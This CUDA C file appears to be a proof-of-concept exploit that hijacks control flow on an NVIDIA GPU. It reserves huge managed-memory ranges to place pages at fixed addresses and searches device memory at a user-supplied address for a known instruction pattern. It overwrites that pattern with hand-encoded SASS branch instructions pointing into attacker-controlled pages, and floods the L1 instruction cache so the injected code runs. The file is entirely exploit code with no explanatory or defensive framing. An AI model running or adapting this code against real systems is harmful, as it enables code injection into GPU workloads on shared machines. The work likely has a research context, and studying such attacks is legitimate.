#include <cuda.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define CHUNK0_SIZE (64L * 1024L * 1024L * 1024L * 1024L + 0x55554000000L)
#define CHUNK1_SIZE (41L * 1024L * 1024L * 1024L * 1024L + 0x0ffc8000000L)
#define STRIDE_SIZE (1L * 1024L * 1024L)

#define BASE_ADDR   0x700000000000
#define DUMMY_ADDR  0x7F0000000000

#define PAGE0_NUM   16
#define PAGE1_NUM   4000
#define WAIT_TIME   1000000000L // about 0.5 seconds on RTX3080

#define BLK_NUM     100
#define SHARED_MEM  (96 * 1024)
#define SMID0       0
#define SMID1       1 // IMPORTANT: SM0 and SM1 are in the same TPC

#define INST1       "membar.cta;"
#define INST2       INST1 INST1
#define INST4       INST2 INST2
#define INST8       INST4 INST4
#define INST16      INST8 INST8
#define INST32      INST16 INST16
#define INST64      INST32 INST32
#define INST128     INST64 INST64
#define INST256     INST128 INST128
#define INST512     INST256 INST256
#define INST1K      INST512 INST512
#define INST2K      INST1K INST1K
#define INST4K      INST2K INST2K
#define INST8K      INST4K INST4K

__device__ void 
branch(uint64_t src, uint64_t dst, uint64_t *ptr0, uint64_t *ptr1)
{
  int64_t off = 0;
  uint64_t lo = 0;
  uint64_t hi = 0;
  
  src += 16;
  off = dst - src;
  lo = (off & 0x00000000FFFFFFFF) << 32;
  hi = (off >> 32) & 0x000000000003FFFF;
  
  *ptr0 = 0x0000000000007947 | lo;
  *ptr1 = 0x003FDE0003800000 | hi;
}

__global__ void 
loop(uint64_t *head, uint64_t *tail, volatile uint64_t *page1, uint64_t addr, uint64_t x)
{
  int i = 0;
  uint64_t y = x;
  volatile uint64_t *ptr = NULL;
  uint64_t bra_lo = 0;
  uint64_t bra_hi = 0;
  uint64_t clk0 = 0;
  uint64_t clk1 = 0;
  uint32_t smid;
  
  asm("mov.u32 %0, %%smid;" : "=r" (smid));
  if (smid != SMID0 && smid != SMID1)
    return;
  
  if (smid == SMID0) {
    for (i = 0; i < (2 * 1024 * 1024 / 8); i += 2) {
      // find "membar.cta;"
      y = *((uint64_t *)addr + i);
      if (y != 0x0000000000007992)
        continue;
      // find "bra l0;"
      y = *((uint64_t *)addr + i + 2);
      if (y != 0x0000000000007947)
        continue;
      y = *((uint64_t *)addr + i + 3);
      if ((y & 0x000000000FFFFFFF) == 0x0000000003800000) {
        ptr = (uint64_t *)addr + i + 2;
        break;
      }
    }
    
    if (ptr != NULL) {
      branch((uint64_t)ptr, (uint64_t)head, &bra_lo, &bra_hi);
      ptr[0] = bra_lo;
      ptr[1] = bra_hi;
      branch((uint64_t)tail, (uint64_t)(ptr + 2), &bra_lo, &bra_hi);
      tail[0] = bra_lo;
      tail[1] = bra_hi;
    }
    
    // use INST8K to evict L1 instruction cache!!!
    asm volatile(
      INST8K
      "l0:"
      "bra l1;"
      "l1:"
    );
    
    clk0 = clock64();
    clk1 = 0;
    while (clk1 < WAIT_TIME)
      clk1 = clock64() - clk0;
    
    asm volatile("bra l0;");
    
  } else if (smid == SMID1) {
    while (y == x) {
      for (ptr = (uint64_t *)page1[0]; ptr != page1; ptr = (uint64_t *)ptr[0])
        ++ptr[2];
      
      y = ptr[1];
    }
  }
  
  page1[1] = 0;
}

__global__ void
put(uint64_t *page, uint64_t x1, uint64_t x2)
{
  page[0] = x1;
  page[1] = x2;
}

__global__ void
link(uint64_t *page_from, uint64_t *page_to)
{
  uint64_t bra_lo = 0;
  uint64_t bra_hi = 0;
  
  branch((uint64_t)page_from, (uint64_t)page_to, &bra_lo, &bra_hi);
  page_from[0] = bra_lo;
  page_from[1] = bra_hi;
}

int 
main(int argc, char *argv[])
{
  uint8_t *chunk0 = NULL;
  uint8_t *chunk1 = NULL;
  uint8_t *base = NULL;
  uint64_t *list0[PAGE0_NUM];
  uint64_t *list1[PAGE1_NUM];
  uint64_t *dummy = NULL;
  uint64_t addr = 0;
    
  cudaDeviceReset();
  cudaFuncSetAttribute(loop, cudaFuncAttributeMaxDynamicSharedMemorySize, SHARED_MEM);

  // hoard a large address space
  cudaMallocManaged(&chunk0, CHUNK0_SIZE);
  cudaMallocManaged(&chunk1, CHUNK1_SIZE);
  
  base = (uint8_t *)BASE_ADDR;
  for (int i = 0; i < PAGE0_NUM; ++i)
    list0[i] = (uint64_t *)(base + i * STRIDE_SIZE);
  base += PAGE0_NUM * STRIDE_SIZE;
  for (int i = 0; i < PAGE1_NUM; ++i)
    list1[i] = (uint64_t *)(base + i * STRIDE_SIZE);
  dummy = (uint64_t *)DUMMY_ADDR;
  
  for (int i = 0; i < PAGE0_NUM - 1; ++i)
    link<<<1, 1>>>(list0[i], list0[i + 1]);
  for (int i = 0; i < PAGE1_NUM; ++i)
    put<<<1, 1>>>(list1[i], (uint64_t)list1[(i + 1) % PAGE1_NUM], 0xdeadbeef);
  put<<<1, 1>>>(dummy, 0, 0);
  cudaDeviceSynchronize();  
  
  addr = strtoull(argv[1], NULL, 16);
  
  loop<<<BLK_NUM, 1, SHARED_MEM>>>(list0[0], list0[PAGE0_NUM - 1], list1[0], addr, 0xdeadbeef);
  cudaDeviceSynchronize();
  
  cudaFree(chunk0);
  cudaFree(chunk1);
}

